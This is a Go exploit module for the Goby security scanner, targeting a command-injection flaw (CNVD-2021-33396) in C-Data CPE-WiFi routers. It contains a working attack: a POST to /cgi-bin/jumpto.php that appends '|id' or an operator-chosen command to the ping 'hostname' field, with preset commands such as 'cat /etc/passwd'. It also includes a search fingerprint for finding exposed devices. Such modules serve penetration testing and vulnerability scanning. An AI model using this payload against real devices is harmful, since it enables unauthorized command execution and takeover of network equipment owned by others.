package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Shenzhen West dieter Technology Co LTD CPE-WiFi tracert RCE",
  "Description": "Shenzhen West dieter Technology Co., LTD CPE-WiFi Command execution vulnerability exists, and attackers can use this vulnerability to execute system commands.  ",
  "Product": "CPE-WiFi",
  "Homepage": "https://cdatatec.com.cn/",
  "DisclosureDate": "2021-08-20",
  "Author": "luckying1314@139.com",
  "GobyQuery": "title=\"Wi-Fi Web管理\"",
  "Level": "3",
  "Impact": "<p>Command execution injection is mainly caused by the fact that the developer references the client parameters when the application system initiates the operating system command, and does not verify the validity of the parameters.&amp;nbsp; Therefore, the attacker can inject malicious command parameters into the parameters, resulting in the execution of the malicious command specified by the attacker.&amp;nbsp; &amp;nbsp;Through this vulnerability, the attacker can execute any operating system commands and directly gain full control of the operating system in the case of improper permission configuration.<br></p>",
  "Recommandation": "<p>1. Verify the validity of the value passed by the parameter</p><p>2. Restrict the execution permission of the application&amp;nbsp</p>",
  "References": [
    "https://www.cnvd.org.cn/flaw/show/CNVD-2021-33396"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "command",
      "type": "createSelect",
      "value": "cat /etc/passwd,ls,id",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1",
        "follow_redirect": true,
        "header": {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        "data_type": "text",
        "data": "call_function=ping&iface=eth0&hostname=127.0.0.1|id"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "uid=",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "gid=",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1",
        "follow_redirect": true,
        "header": {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        "data_type": "text",
        "data": "call_function=ping&iface=eth0&hostname=127.0.0.1|{{{command}}}"
      },
      "SetVariable": [
        "output|lastbody"
      ]
    }
  ],
  "Tags": [
    "RCE"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": [
      "CPE-WiFi"
    ]
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}